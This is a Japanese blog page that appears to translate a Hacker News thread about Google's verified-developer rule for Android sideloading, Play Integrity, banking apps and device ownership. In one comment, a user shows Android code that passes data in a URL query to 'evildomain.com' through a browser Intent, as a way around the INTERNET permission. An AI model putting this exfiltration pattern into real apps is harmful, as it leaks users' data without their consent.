+++
date = '2025-08-25T00:00:00'
months = '2025/08'
draft = false
title = 'Google、Androidアプリのインストールを『検証済み開発者』のみに制限！ユーザーの自由度に影響か'
tags = ["Android", "Google", "アプリ", "開発者", "セキュリティ"]
featureimage = 'thumbnails/blue.jpg'
+++

> Google、Androidアプリのインストールを『検証済み開発者』のみに制限！ユーザーの自由度に影響か

引用元：[https://news.ycombinator.com/item?id=45017028](https://news.ycombinator.com/item?id=45017028)




{{<matomeQuote body="追加情報として、TechCrunchの記事とGoogleの公式アナウンスメント2つ、Play ConsoleのヘルプページのURLを載せとくね。(merged threadからだよ)<br>https://techcrunch.com/2025/08/25/google-will-require-develo...<br>https://android-developers.googleblog.com/2025/08/elevating-...<br>https://developer.android.com/developer-verification<br>https://support.google.com/googleplay/android-developer/answ..." userName="kotaKat" createdAt="2025/08/25 18:18:18" color="#ff5733">}}




{{<matomeQuote body="自分のデバイスを使うのに、海外企業と契約関係を結ばないとダメになるってことだね。GrapheneOSも厳しくなるし、銀行アプリはPlay Protect使うから自由が利かない。Androidはもはやオープンソースとは言えないよ。そろそろHuaweiのHarmonyOSみたいな第三のスマホOSが必要じゃない？ 特にモバイルファーストのサービスが多いからさ。" userName="arielcostas" createdAt="2025/08/26 11:11:45" color="#45d325">}}




{{<matomeQuote body="根本的な問題はPlay Integrityだと思うんだよね、これさえなければ良いのに。アプリが「公式認定されたAndroidデバイスでしか動かない」って言えるのが問題の核心だよ。これがないなら、Google以外のAndroidでも公平に競争できるし、嫌ならGrapheneOSとか使えばいい。Play Integrityがあるから銀行アプリとか使えなくなるリスクが常にあるんだよ。これさえなくなれば、Googleの制限にももっと納得できるんだけどな。" userName="pimterry" createdAt="2025/08/26 11:20:21" color="#38d3d3">}}




{{<matomeQuote body="銀行はPlay Integrityを本当に「欲しがってる」みたいだね。ユーザーが管理するデバイスでのオンラインバンキングが完全に廃止されるのを望んでいるようにすら見えるよ。" userName="avhception" createdAt="2025/08/26 11:30:25" color="">}}




{{<matomeQuote body="それは、Play Integrityがそこにあるから使ってるだけだよ。もし提供されてなかったら、銀行側が「99.99999%のスマホで動くこのセキュリティ機能、使わないようにしましょう」なんて経営陣に言うわけないじゃん。" userName="IshKebab" createdAt="2025/08/26 11:47:23" color="">}}




{{<matomeQuote body="元銀行アプリ開発者として言わせてもらうと、いや違うね。Play Integrityみたいな機能は、もし無かったら企業や銀行側が間違いなく要求するよ。今は脆弱な人を狙った詐欺が多いし、スマホへの攻撃はすごく「簡単」なんだ。もしかしたら「信頼モード」と「オープンモード」を切り替えられるような、もっと寛容な実装方法があるかもしれないけど、現実的にはそんな需要は大きくないだろうね。" userName="mhast" createdAt="2025/08/26 12:03:38" color="#ff33a1">}}




{{<matomeQuote body="Play Integrityは悪意ある行為を防ぐのにほとんど役立たないよ。むしろ、銀行みたいな人たちに誤った自信を与えてるから、全体的に有害だと思う。Play Integrityがあってもクライアントを信頼しちゃダメだ。デバイスはまだ危険だし、偽の銀行アプリもあるし、キーロガーもある。Webだとクライアントを信頼しないようにアプリを設計せざるを得ないけど、Play Integrityがあるとそうしないかもしれない。それが大きな問題だよ。" userName="const_cast" createdAt="2025/08/26 12:30:22" color="#45d325">}}




{{<matomeQuote body="でも、ブラウザにはこんなのを要求しないのが absurd だよね。誰かがバックドア付きの改ざんされたブラウザをダウンロードする方が、特定の銀行アプリの改ざん版をダウンロードするよりもはるかにリスクが高いと思うんだけど。攻撃者には同じレベルの制御を許しちゃうのにさ。" userName="ulrikrasmussen" createdAt="2025/08/26 13:24:43" color="#ff5733">}}




{{<matomeQuote body="銀行はブラウザを受け入れてきたわけじゃないよ。ログインや取引承認のような重要なことには、モバイルアプリやSMSコード、スマートカードリーダーみたいな、もっと管理された別のハードウェアを要求してたんだ。最近は取引デバイスに基づいてリスク分析もしてるし、スイスみたいにQRコード決済はモバイルアプリ必須とか、モバイルに移行させようとしてるね。一部の銀行はもっと緩いけど、多くの地域ではオンラインバンキングの初期からこれが常識だったんだ。" userName="mike_hearn" createdAt="2025/08/26 13:27:07" color="#ff5733">}}




{{<matomeQuote body="それって「シートベルトしても人が死ぬから無意味」っていう議論だよね。しかも「かえって安心感を与えて危険」ってオマケつき。Play Integrityは、ブルートフォース攻撃や侵害されたデバイスからの攻撃を大幅に減らすんだよ。もちろん完全に排除はできないけど、複雑なシステムでは検証済みの完璧な解決策なんてめったにないから、セキュリティは統計のゲームなんだ。ほとんどの大規模な公開アプリでは、サインイン試行の大半が悪意のあるものだし、成功した攻撃の大部分はデスクトップWebみたいな非認証プラットフォームから来てる。アッテステーションはここで貴重なツールなんだよ。" userName="brookst" createdAt="2025/08/26 12:43:36" color="#45d325">}}




{{<matomeQuote body="「GNU/Linux」タッチ版でちゃんとしたエコシステムを作るのは超難しい問題だよね。Linus Torvaldsみたいな大物がリーダーシップを発揮するか、Microsoftみたいな大企業が巨額を投じないと無理。小さな努力だとバラバラのままだよ。クラウドファンディングも有名人が絡めば強いけど、Star Citizenが8億ドルも集めたみたいにね。GNU/Linuxスマホ開発を誰がリードするんだろうね？" userName="Ciantic" createdAt="2025/08/26 11:52:09" color="#45d325">}}




{{<matomeQuote body="それは…間違いだよ。デンマークで使ってる銀行は全部、アプリなしでログインして全ての操作ができるんだ。認証と承認には国のデジタルID（MitID）を使うけど、それはアプリだけじゃなくTOTPトークンやFIDO（または類似の）チップとしても使えるからね。アプリは必要ないんだ。OSをロックダウンしてクライアントの信頼を確立する必要はないってことだよ。Play Integrityなしでも、NFCでハードウェアトークンをスキャンすればいいんだから。" userName="ulrikrasmussen" createdAt="2025/08/26 13:35:40" color="#785bff">}}




{{<matomeQuote body="そりゃそうするよ、銀行は。ユーザーのバカげた行為のせいで、とんでもない法的責任を負ってるんだからさ。もし俺の銀行口座が不正利用されても、俺がどんなセキュリティ対策もしてなくても、銀行は返金しなきゃいけない。もし銀行が「パスワードマネージャーやMFAを使ってないなら自業自得だ」って言えたら、こんなことしないだろうけど、政府が許さないんだ。詐欺師への合法的な送金でも、銀行に責任を負わせる動きすらある。そりゃ銀行も、ユーザーの動きを監視してデバイスを制御したがるさ。インセンティブを考えたら、そうしない方がバカだろ。" userName="terminalshort" createdAt="2025/08/26 13:58:00" color="#38d3d3">}}




{{<matomeQuote body="Purism Librem、Liberux NEXX、/e/ foundation、eelo、Ubuntu Edge、Jolla phone…たくさんのクラウドファンディングがあったけど、どれも成功しなかったね。一番惜しかったのはMozillaのFirefox OSかな、今はKai OSだけど。俺もまだAlcatel OT Fire phone持ってるよ、HTML5全開さ！<br>でも、Sailfish OSは成熟したエコシステムを持ってて、EUでもよく知られてるし、GNU/Linuxベースだよ。俺はUBportsから乗り換えて毎日使ってるけど、すごく快適。もっとSailfish OSが人気になるといいな。" userName="niutech" createdAt="2025/08/26 12:14:40" color="#ff5733">}}




{{<matomeQuote body="Play Integrityがなくなったら、普通のAndroidユーザーは急にCAPTCHAとか他のセキュリティ対策が爆増するだろうね。AI企業がウェブサイトを猛烈にスクレイピングしてることへの怒りのコメントと、デバイスアテステーションに不満を持つコメントが、同じコインの裏表だってことに気づいてる人が少ないのは面白いよ。Play Integrity（AppleのPATもね）は、モバイルユーザーがPCユーザーより煩わしさ少ないのはそのためなんだ。それがモラル的に良いこととは言わないけど（技術はめったにモラル的じゃないから）、一般ユーザーにもパワーユーザーにもメリットとデメリットがある能力なんだよ。" userName="brookst" createdAt="2025/08/26 12:36:36" color="#45d325">}}




{{<matomeQuote body="デバイスアテステーションがブルートフォース攻撃をどうやって減らすの？バックエンドがアカウントごとの試行回数制限を設けてないなら、それは重大な脆弱性だよ。そうじゃないなら、アテステーションはその役目を果たしてない。デバイスが侵害された場合（悪意のあるメイド攻撃を想定してるなら）、Androidにはセキュアブートが実装されてて、信頼の連鎖が壊れたらデータは全消去される。もう十分すぎるほどの警告が出てるから、何も知らない“平均的なユーザー”を諦めさせるには十分だし、ユーザーを騙すもっと簡単な方法もあるんだよ。" userName="pona-a" createdAt="2025/08/26 12:55:25" color="#45d325">}}




{{<matomeQuote body="俺はそういうシステムに携わってきたけど、好き嫌い関係なく、リモートアテステーションは不正利用を叩き潰すんだ。詐欺スキームを利益が出るレベルまで拡大するのが、自動化できないと格段に難しくなるからね。だから、それが存在してて、銀行もそれを使ってるんだよ。" userName="mike_hearn" createdAt="2025/08/26 13:02:44" color="#ff5c5c">}}




{{<matomeQuote body="まさに俺が言ってるのはそれだよ。ウェブブラウザだけで操作はさせないんだ。モバイルアプリを使わないなら、似たような機能を持つ信頼できるハードウェアを渡されるんだ（大抵はセキュリティが甘くて不便だけどね）。俺の銀行はまだスマートカードリーダーでログインや取引承認ができるけど、新しい受取人を承認するには口座番号の一部を入力しなきゃいけない。その後ならハードウェア認証なしで追加の取引ができるよ。純粋なNFCトークンじゃダメ。信頼できるI/Oが必要なんだ。" userName="mike_hearn" createdAt="2025/08/26 13:38:22" color="#785bff">}}




{{<matomeQuote body="「第3の大型スマホOSが必要な時だ」って？もう何年も前からそうだよ。今一番近いのは、いろいろあるスマホ向けLinuxディストロだね。でも、少なくともPinephoneではまだ実用レベルじゃないんだ。それでも、本気で変化を望むなら、そこに時間とお金を投入すべきだよ。" userName="TheCraiggers" createdAt="2025/08/26 12:08:51" color="#ff5c5c">}}




{{<matomeQuote body="そんな単純な話じゃないんだ！Play Integrityの最高レベルの認証には、セキュリティアップデートが1年以内に提供されてるデバイスが必要なんだよ。多くのAndroidデバイスは長年セキュリティアップデートが出てないから、これはユーザーに不必要に高いOEM製品に買い替えを強要してるんだ。GoogleはXiaomi、Huawei、その他多くの優れた格安オプションを提供する企業を事実上締め出してる。Googleは単にCAPTCHAを減らして快適さを提供してるだけじゃなくて、最も重要なのは独占を図ってるんだ。" userName="j4hdufd8" createdAt="2025/08/26 14:35:10" color="#ff5c5c">}}




{{<matomeQuote body="技術に詳しい人は、仕事用と個人用の2台持ちになるだろうね。片方は銀行とか会社用、もう片方は自由に使えるデバイスにして、ホットスポットでつなぐ感じ。クリーンな使い方と変な使い方を分けるのは、もしかしたら良いことなのかもね。" userName="nick486" createdAt="2025/08/26 12:38:01" color="#785bff">}}




{{<matomeQuote body="小規模な開発者がバラバラに頑張ってるのが問題なんだよね。SailfishOSには頑張ってほしいけど、有名な後ろ盾がないとクラウドファンディングも難しい。新しいOSが勝つには、アプリ開発者が参入したくなるようなユーザーが必要だよ。SailfishOSでもAndroidアプリ互換性が必要だけど、Play ServicesとかPlay integrityでそのうち使えなくなるだろうね。" userName="Ciantic" createdAt="2025/08/26 12:23:01" color="#45d325">}}




{{<matomeQuote body="Androidはもうオープンソースじゃないって諦めたわ。Ubuntu Phoneも夢だったな。誰もデバイス作ってくれないし、キャリアも興味ないし、市場に食い込むのは無理。MicrosoftやAmazonが本気でオープンソースにして、フラッグシップ機と多額の投資をすればワンチャンあるかもだけど、アプリ移行も大変だもんね。" userName="giancarlostoro" createdAt="2025/08/26 12:34:37" color="">}}




{{<matomeQuote body="司法とか政治家がテクノロジーに疎いからこんなの許されてるんだよね。Play Integrityが独禁法違反なのは明らかだよ。Google以外のAndroidフォークを排除することが、このシステムの唯一の目的なんだから。" userName="realusername" createdAt="2025/08/26 11:57:07" color="">}}




{{<matomeQuote body="Googleで attestation システムを開発してた者だけどさ、パスワードの総当たり攻撃ってサーバー側じゃ無理なんだよね。ボットネットは大量のIPから攻撃してくるから。デバイス attestation は、攻撃者に「ロボットだらけの倉庫」を用意させるレベルで難しくするよ。ブラウザじゃ限界あるけど、モバイルアプリなら可能。GoogleはJavaScript VMでブラウザ自動化を見つけてて、昔はめっちゃ効果あったんだ。" userName="mike_hearn" createdAt="2025/08/26 13:24:39" color="#45d325">}}




{{<matomeQuote body="「第三のデカいスマホOS」なんて、AppleとGoogleが共謀して潰したんだよ。Microsoftでさえ追い出されたんだからね。これ以上強い挑戦者がいるわけないじゃん？" userName="rollcat" createdAt="2025/08/26 12:33:16" color="">}}




{{<matomeQuote body="Play IntegrityとPATを使って、正規ユーザーにはCAPTCHAなし、不正なクライアントにはチャレンジさせる製品開発してる者だけどさ、あなたの言ってることは間違ってるよ。メリットがデメリットを上回るかは別として、このシステムの使われ方を知らないと、デメリットも正確に理解できてないんじゃないかな。" userName="brookst" createdAt="2025/08/26 12:46:35" color="">}}




{{<matomeQuote body="Play Integrityなんて信じられないね。(1) 不正が起きないって勝手に思い込んでるだけじゃん。(2) フィッシングとかソーシャルエンジニアリングとか、意味ある詐欺は何も防げないよ。ほとんどの銀行詐欺は本物のアプリやサイトで起こるし、偽アプリなんていらないんだから。小切手詐欺やクレカ詐欺も同じだよ。" userName="const_cast" createdAt="2025/08/26 14:40:29" color="#38d3d3">}}




{{<matomeQuote body="(ID 60538への返答) ローエンドのOEMだってセキュリティアップデートは出せるよ。でもそうすると、安いデバイスのコストが上がっちゃうし、メーカーも儲からなくなるからね。" userName="devmor" createdAt="2025/08/26 15:18:55" color="">}}




{{<matomeQuote body="Google Play Protectとかいうくだらないものに何のメリットがあるんだ？結局ウェブブラウザから銀行にアクセスできるなら無意味じゃん。こんなバカな機能は誰も守れないよ。" userName="gonzalohm" createdAt="2025/08/26 11:40:47" color="">}}




{{< details summary="もっとコメントを表示（1）">}}

{{<matomeQuote body="これを否定するのは勝手だけど、使われる理由に困惑するのはおかしいよ。詐欺や悪用は顧客がアカウントをハッキングされて怒る形で表面化するんだ。この機能はフィッシング対策にも効果的で、やり方は説明しても信じないだろうけどね。小切手詐欺なんて言ってるってことは、セキュリティがひどいアメリカの銀行を使ってるんだろ？USA以外のまともな銀行じゃ、パスワードだけじゃ口座には入れないし、小切手詐欺もクレジットカードのフィッシングもないんだよ。全てのクレジットカード取引は、ペアリングされたモバイルアプリへのプッシュ通知でリアルタイム承認されるからね。" userName="mike_hearn" createdAt="2025/08/26 15:02:13" color="#785bff">}}




{{<matomeQuote body="俺たちが所有するPCにソフトウェアをインストールしたり変更したりできるべきだっていう前提から、毎日どんどん離れていってるよ。「rootアクセス権」の概念をもう一度提唱するべきだね。大企業がこういうくだらないことを繰り返すのを防ぐためにさ: https://medhir.com/blog/right-to-root-access" userName="medhir" createdAt="2025/08/26 03:18:33" color="#785bff">}}




{{<matomeQuote body="マルウェア作って何十億も騙し取るクソ野郎どもに言ってやれよ。ほとんどのユーザーはネットで自分自身を守れないんだ。深く考えずに何でもインストールしたがる。企業がこれらを可能にして、普通の人がリンクをクリックしたり、どんなガラクタでもインストールしたりしても、ある程度安全でいられるようにしてるんだ。" userName="ozim" createdAt="2025/08/26 10:23:13" color="">}}




{{<matomeQuote body="問題は、俺たちが所有するPCを改造できるべきかじゃなくて、そもそも俺たちが本当にそれを「所有」しているのか、ってことなんだよ。" userName="_heimdall" createdAt="2025/08/26 03:53:43" color="">}}




{{<matomeQuote body="そのうち企業はブラウザまでロックダウンしようと考えてるぞ。これ覚えてるか？ https://chromestatus.com/feature/5796524191121408<br>大企業や政府が応援する中で、また試してくるだろうね。" userName="baq" createdAt="2025/08/26 06:06:21" color="#785bff">}}




{{<matomeQuote body="「大企業や政府が応援する中で、また試してくるだろうね」<br>まったくだよ。彼らは一度勝てばいいだけ。俺たちは、終わりのない攻撃から自分たちの自由を守り続けなきゃならないんだ。もううんざりだし、幻滅してるよ。" userName="matheusmoreira" createdAt="2025/08/26 07:28:45" color="">}}




{{<matomeQuote body="企業が何を言おうと、俺たちが買ったデバイスは、俺たちのものだ。" userName="yesbut" createdAt="2025/08/26 04:04:16" color="">}}




{{<matomeQuote body="いつもそうとは限らないよ。サブスクでしか機能が有効にならない車を売ってる自動車メーカーもあったし。ヒーター付きシートの車を買っても、メーカーが有効にしないとシートヒーターが使えない、みたいなね。" userName="_heimdall" createdAt="2025/08/26 04:17:20" color="">}}




{{<matomeQuote body="一つの方法は、理想的とは程遠いけど一番簡単なのは、古いデバイスと古いOSだけを使うことだね。ハッキングされたり、root化しやすいやつ。「でも安全じゃないだろ！」って？いや、それがポイントなんだよ。" userName="bambax" createdAt="2025/08/26 08:03:45" color="">}}




{{<matomeQuote body="ルートアクセスは禁止せず、リスクを教えて保証を無効にするだけでいい。<br>ユーザーが自分のハードウェアで好きなことをできるようにするべきだね。<br>所有者の自由を奪わないでほしいな。" userName="fimdomeio" createdAt="2025/08/26 10:31:25" color="#ff5c5c">}}




{{<matomeQuote body="私有財産や知的財産、所有権のあり方って、まだ人類にはちゃんとした答えがないよね。<br>でも、もっと普通の人が利益を得られるべきだと思うんだ。" userName="_def" createdAt="2025/08/26 04:22:41" color="">}}




{{<matomeQuote body="1000万ドルでチップ製造工場を建てられないと、本当にコンピューターを「所有」してるって言えないよね。<br>ハードウェアが身近にならないと、結局は大きな企業がソフトウェアを全部コントロールしちゃうんだ。" userName="abdullahkhalids" createdAt="2025/08/26 06:04:26" color="#ff33a1">}}




{{<matomeQuote body="これはマルウェアや詐欺の話じゃなく、ただのPRの言い訳だよ。<br>Googleの本当の目的は、Play Storeの収益を増やすこと。AppleとGoogleのアプリ手数料収入の差を見れば明らかだよね。<br>Googleの「ユーザーのため」なんて信じちゃダメ。彼らは独占を強化して利益を最大化したいだけなんだから。Androidを閉鎖的に保つために、S&P500企業が払う以上のお金を弁護士費用に使ってるよ。" userName="thecupisblue" createdAt="2025/08/26 10:53:33" color="#38d3d3">}}




{{<matomeQuote body="自分で買った車のシートヒーターを、メーカーに連絡しないで使えるようにするのを禁止する法律なんて、あってはいけないよね。" userName="AnthonyMouse" createdAt="2025/08/26 04:27:18" color="">}}




{{<matomeQuote body="EUがChat Control法案を導入したら、簡単に回避できることに気づくはず。<br>そうなると、次はすべてのデバイスをロックダウンするって話になるよね。<br>そしたら、私たちのデジタルインフラは全部、モバイル市場の二大巨頭であるAppleとGoogleに完全に支配されちゃうよ。" userName="ulrikrasmussen" createdAt="2025/08/26 08:59:09" color="#ff5733">}}




{{<matomeQuote body="自分のミスから、困ってる一部の人たちを守ろうとすることで、社会全体がどれだけ不便になってるか、びっくりするよね。" userName="quotemstr" createdAt="2025/08/26 05:06:30" color="">}}




{{<matomeQuote body="「自分が持ってるコンピューターにソフトを好きにインストール・変更できるべき」っていう考え方には、俺は賛成したことないな。<br>普段の生活でも、だいたい自分の欲しいものを買ってるだけだし、コンピューターもそれでいいんじゃないかって思ってるよ。" userName="paulcole" createdAt="2025/08/26 03:58:14" color="">}}




{{<matomeQuote body="Googleを弁護すると、彼らはたくさんのスパムアプリを許してたことで、めっちゃ批判されてたんだよね。" userName="wouldbecouldbe" createdAt="2025/08/26 06:41:55" color="">}}




{{<matomeQuote body="だから、必要ならいつでもLinuxを使って、全部ソースからコンパイルすればいいんじゃない？" userName="hoppp" createdAt="2025/08/26 10:29:50" color="">}}




{{<matomeQuote body="高齢の親の介護経験から、ネットは認知能力が低い人には危険すぎるって痛感したよ。現代社会でネットなしは無理ゲーで、親からネットを取り上げたらもっと孤立しちゃう。詐欺師に法の裁きはないし、弱者はデマや詐欺のやりたい放題。どうにかしてくれ！" userName="carefulfungi" createdAt="2025/08/26 11:42:30" color="#ff33a1">}}




{{<matomeQuote body="シートヒーターの話は特殊だけど、車を勝手に改造すると危険だから政府が規制するのはアリって意見もあるよね。ITでも、無線周波数帯を誰もが自由に使いまくったら、かえって不利益が大きい。だから、どこまでが自由で、どこからが規制かって線引きはめちゃくちゃ難しいんだよ。" userName="gf000" createdAt="2025/08/26 06:10:52" color="#ff5733">}}




{{<matomeQuote body="これじゃ全然足りないよ。銀行アプリとか、生活に必須なのに、root化されてないGoogle Play Services付きのスマホじゃないと動かないことが多いんだ。しかも2年前のOSはすぐサポート終了とか、完全に消費主義に踊らされてる。この寡占状態をぶっ壊す法律が必要なのに、EUですら逆行してるのはマジで残念。" userName="andrepd" createdAt="2025/08/26 08:45:36" color="#ff5c5c">}}




{{<matomeQuote body="PCはさ、買ってSecure Boot無効にしてLinux入れたら、あとは好き勝手できるじゃん？スマホだって同じようにできても良くない？" userName="ozgrakkurt" createdAt="2025/08/26 07:01:10" color="">}}




{{<matomeQuote body="俺らは元々、買ったものを好きにできる権利を持ってる！でも、ちょっとした法的な判断がディストピアを生んだんだ。特にFirst-sale doctrineが全てを解決するはずなのに。裁判所がライセンス例外を善意で解釈しちゃったせいで、First-sale doctrineが事実上骨抜きにされた。この抜け穴とDMCAさえなくせば、こんなバカな制限はすぐになくなるはず！買ったものは、商業目的の複製以外は好きにしていいんだ！<br> [1] - https://en.wikipedia.org/wiki/First-sale_doctrine" userName="somenameforme" createdAt="2025/08/26 05:20:16" color="#45d325">}}




{{<matomeQuote body="みんな間違いはするもんだ。だから、最下層の人たちを過ちの結末から守るってことは、誰だってミスる可能性があるから、結局はみんなを守ることになるんだよ。社会は、常にビクビクして重大なミスをしないようにしなきゃいけない、なんて構造であるべきじゃないだろ。" userName="bluefirebrand" createdAt="2025/08/26 05:17:41" color="#ff5733">}}




{{<matomeQuote body="俺の周りには、スマホでマルウェア入れたりハッキングされたりした奴はマジでゼロ人だね。被害にあったって知ってるのはみんなPCユーザーで、しかも「IT部門です」みたいなソーシャルハッキングに引っかかった奴らばっか。友達も、それで銀行の顧客データを何千人分も漏洩させちゃったんだから。" userName="epolanski" createdAt="2025/08/26 10:31:46" color="">}}




{{<matomeQuote body="人に自由な発想をさせながら、間違いをゼロにするなんて無理ゲーでしょ。素晴らしいアイデアのほとんどは、最初はバカげてるように見えるもんだよ。俺は安全第一よりも、新しい発見を重視する世界で生きたいね。" userName="quotemstr" createdAt="2025/08/26 05:21:17" color="#ff33a1">}}




{{<matomeQuote body="あのシートヒーターの件、妥当なエッジケースだと思ったの俺だけ？ヒーターってレザーシートの寿命縮めるらしいじゃん。全車に搭載する方が、2種類の生産ライン作るより安く済むしね。サブスクは、ヒーター使ってシート交換が早まるコストを相殺する費用だったんだよ。もし自分でヒーター使ってシートがダメになっても、保証で使えるようにする選択肢があったら無料で交換する必要なかったはず。それに、反発でサブスク自体やめたらしいしね。" userName="protocolture" createdAt="2025/08/26 05:58:31" color="#ff33a1">}}




{{<matomeQuote body="ハードウェアの破れないロックを禁止する規制も必要だね。VLSIの奥深くにロックを組み込まれたら、もうどうしようもないから。もっと具体的に言うと、ハードウェアメーカーのソフトは、ハードの一部か独立製品か選ばせてほしいな。ハードの一部ならGPLv3とアンチTiVo化条項で公開義務。独立製品なら、公開されたAPIのみ使って、他社が公平に競合製品作れるようにするべき。理想はクロスプラットフォームで、できないなら開発者が証明する、って感じ。" userName="john01dav" createdAt="2025/08/26 08:30:31" color="#ff5733">}}




{{<matomeQuote body="規制で阻止するより、製品買う前にメーカーがちゃんと説明する規制がいるんじゃない？情報に基づいた同意ってすごく大事だよ。" userName="_heimdall" createdAt="2025/08/26 21:46:48" color="#785bff">}}

{{</details>}}




{{< details summary="もっとコメントを表示（2）">}}

{{<matomeQuote body="ハードウェアメーカーがみんなSecure Bootを強制することになったら、どうやってLinuxをインストールするつもり？「セキュリティのため」って言うけどさ。" userName="gkbrk" createdAt="2025/08/26 11:07:20" color="#ff5c5c">}}




{{<matomeQuote body="「リスクを知らせるだけでいい」って言うけど、警告だけじゃダメな時もあるんだ。人が自分を傷つけないように物理的に制限する必要があることも。みんながバカなわけじゃない。疲れてたり、気が散ってたりして詐欺に遭う賢い人もいるし、「デバイスがOKなら問題なし」って思って警告無視する人も多いよね。" userName="scott_w" createdAt="2025/08/26 12:41:03" color="#38d3d3">}}




{{<matomeQuote body="公式発表と情報源はこれ→ https://android-developers.googleblog.com/2025/08/elevating-...、https://developer.android.com/developer-verification、https://support.google.com/googleplay/android-developer/answ...<br>正直、Play Storeは悪意あるアプリだらけで、こんな認証はユーザー保護にならない。これはGoogleのパワープレイで、Revancedみたいなアプリを潰すためだよ。Googleは気に入らない開発者をすぐにアカウント停止にするだろうし。Googleが「安全」って言うたび、隠れたInternetパーミッションで95%のマルウェア防げるのに、広告ブロックさせたくて隠してるんだなって思う。あと「開発者を確認するだけでアプリの中身はレビューしない」って変じゃない？それじゃマルウェア防げないし。もうGoogleアカウントなんて作ってまでAndroid向けに開発する気ないね。LinuxとWindowsで十分。" userName="87636899376" createdAt="2025/08/25 20:01:04" color="#785bff">}}




{{<matomeQuote body="Internetパーミッションって広告とは関係ないよ？隠されてるのは、1) Internet接続なんて当たり前すぎて表示しても邪魔なだけだから。2) 完璧じゃないから。Internetパーミッションがなくても、Intentとか使って他のアプリ経由でデータは簡単に外に送れるんだよ。" userName="kllrnohj" createdAt="2025/08/25 21:02:02" color="#ff5733">}}




{{<matomeQuote body="これってユーザーのセキュリティのためじゃないよね。権力と顧客囲い込みのためだよ。Googleはスマホがハッキングされても銀行口座が空になっても気にしない、大事なのは収益だけ。Androidは今のままでいい。もしGoogleが心配なら、Play Storeを2層にすればいいんじゃない？厳選アプリのストアと、今のストアみたいな自由なストアにさ。選択肢は良いこと、ロックダウンは悪いことだよ。" userName="EasyMark" createdAt="2025/08/26 01:04:46" color="#ff5733">}}




{{<matomeQuote body="「Internet接続は当たり前だから表示してもノイズ」って言うけど、それって全然役に立たないってことにはならないよ。「Internetパーミッションは完璧じゃない」って言うけど、それをバイパスする具体的なPoCは見たことないんだよね。仮に欠陥があるとしても、ユーザーがそれを無効にできたら、Googleだってちゃんと機能させるように頑張るんじゃないの？" userName="87636899376" createdAt="2025/08/25 21:26:40" color="#38d3d3">}}




{{<matomeQuote body="この隠れたInternetアクセス制御設定について、もう少し詳しく教えてくれない？" userName="baby_souffle" createdAt="2025/08/25 20:36:15" color="">}}




{{<matomeQuote body="これはやりすぎな対応だけど、Googleがセキュリティ脅威をでっち上げてるわけじゃないんだ。攻撃者がユーザーにマルウェアをサイドロードさせるのはマジな話だよ。詳しくはここ見て→ https://www.bitdefender.com/en-us/blog/hotforsecurity/hacker..." userName="skybrian" createdAt="2025/08/26 01:29:44" color="#ff5733">}}




{{<matomeQuote body="「InternetパーミッションをバイパスするPoCを見たことがない」って言うけど、例えば`Uri uri = Uri.parse(”https://evildomain.com/upload?data=DATA_GOES_HERE);`って書いて、`Intent i = new Intent(Intent.ACTION_VIEW, uri);`でブラウザアプリに送らせれば、ブラウザがデータを勝手に送っちゃうんだよ。Intentの受信側アプリの全てのパーミッションを要求するのは、Androidのエコシステムにとってヤバい変更になっちゃうからね。" userName="UncleMeat" createdAt="2025/08/25 22:23:12" color="#785bff">}}




{{<matomeQuote body="俺のスマホのアプリを見ても、インターネット不要なものが1/4もある。水準器とかGPS速度計とか、なんでネットアクセスいるんだ？Googleの収益源考えたら、データ収集や広告目的だろうな。Manifest V3の件もそうだし、インターネット接続権限を無効にするのはGoogleの儲けのためだろ。<br>" userName="zrobotics" createdAt="2025/08/25 22:30:26" color="#45d325">}}




{{<matomeQuote body="`＜uses-permission android:name=”android.permission.INTERNET” /＞`ってAndroid 1.0からあるんだぜ。問題は、ユーザーがこれを拒否できないことだ。<br>" userName="nottorp" createdAt="2025/08/25 21:45:28" color="">}}




{{<matomeQuote body="Googleは（この記事にある変更点みたいに）実際に問題のあること山ほどやってるよ。だからといって、わざわざ変な陰謀論をでっち上げる必要はないだろ。<br>" userName="kllrnohj" createdAt="2025/08/26 00:48:21" color="">}}




{{<matomeQuote body="＞攻撃者がユーザーにマルウェアをサイドロードさせるのは現実だ。 <br>いや、それはGoogleの問題じゃないだろ。誰かがSwiss Army knifeで人を切ってもVictorinoxの問題じゃないし、Toyota車で歩行者をひいてもToyotaの問題じゃないのと一緒だ。<br>" userName="eadmund" createdAt="2025/08/26 01:47:28" color="">}}




{{<matomeQuote body="車会社は車が簡単に盗まれることを気にするし、たとえ盗難が個別の責任じゃなくても新型車のセキュリティを改善するよな。そうしないと評判が落ちて政府が動くかもしれないから。だから実際には、大企業はユーザーのことを気にかけなきゃいけないんだ。個々じゃなくて、全体としてね。<br>" userName="skybrian" createdAt="2025/08/26 01:59:13" color="#ff33a1">}}




{{<matomeQuote body="だから何なんだよ？許可のプロンプト出せばいいだろ。ユーザーに確認させろよ。それに、電卓アプリがWebViewをポップアップさせたら、データが漏れてるってすぐに気づくもんじゃないのか？<br>" userName="sterlind" createdAt="2025/08/26 04:26:45" color="">}}




{{<matomeQuote body="「アプリがブラウザにリンクするたびに許可プロンプトを出す」なんて、ユーザーは好きじゃないだろ。確かに怪しいけど、悪意のあるページはgoogle.comとか無害なサイトにリダイレクトするだけだしな。ユーザーには「あれ、Chromeが勝手に開いたな」としか見えないぞ。<br>" userName="UncleMeat" createdAt="2025/08/26 06:03:19" color="">}}




{{<matomeQuote body="WindowsにもCode Signingっていう同じようなものがあるんじゃないか？<br>https://www.electronforge.io/guides/code-signing/code-signin...<br>" userName="nolist_policy" createdAt="2025/08/26 06:16:09" color="">}}




{{<matomeQuote body="それは全く不必要な意味ででっち上げられたものだよ — ほとんどのマルウェアはPlay Storeにあるんだから。<br>" userName="const_cast" createdAt="2025/08/26 13:11:01" color="">}}




{{<matomeQuote body="＞Googleが“安全性”って言うたびに、Androidには95%の悪意あるアプリを無力化できる隠されたインターネット権限があることを思い出すんだ。でもそれは隠されてて、ユーザーがそれ使ってアプリの広告ブロックするのを防ぐ方が、Googleには大事らしいな。<br>データ流出にインターネット権限は必要なかったよ。攻撃者が所有するページを、流出させたいデータをquery parametersに入れてブラウザアプリにIntentを送るだけで済むからな。<br>" userName="UncleMeat" createdAt="2025/08/25 22:19:10" color="#785bff">}}




{{<matomeQuote body="Huh？ 「whack ass」って何？OSに組み込まれてるインターネット許可がユーザーに公開されてないのが問題だよ。親コメントは必要ないって言ってたけど、広告とかテレメトリー以外にネットを使わないアプリもたくさんあるんだから。これは全部事実。罵倒するんじゃなくて、なんでこの設定がユーザーに公開されてないのか、合理的な説明をしてくれないかな？" userName="zrobotics" createdAt="2025/08/26 01:11:55" color="#ff5c5c">}}




